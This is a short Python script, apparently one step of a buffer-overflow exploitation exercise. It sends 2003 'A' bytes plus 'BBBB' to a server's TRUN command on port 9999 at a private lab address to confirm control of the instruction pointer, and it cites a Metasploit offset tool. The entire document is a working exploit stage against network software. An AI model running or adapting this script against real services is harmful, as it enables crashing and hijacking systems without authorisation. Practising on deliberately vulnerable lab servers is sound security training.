#!/usr/bin/python
# Step 3 after findOffset.py script. 
# To get 2003 use /usr/share/metasploit-framework/tools/exploits/pattern_offset.rb -l 3000 -q 386F4337 (whats in the EIP)

import sys, socket
from time import sleep

buffer = "A" * 2003
buffer += "BBBB"

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('192.168.200.169', 9999))
  s.send(('TRUN /.:/' + buffer))
  s.close()
except:
  print("Fuzzing crashed at %s bytes" % str(len(buffer)))
  sys.exit()


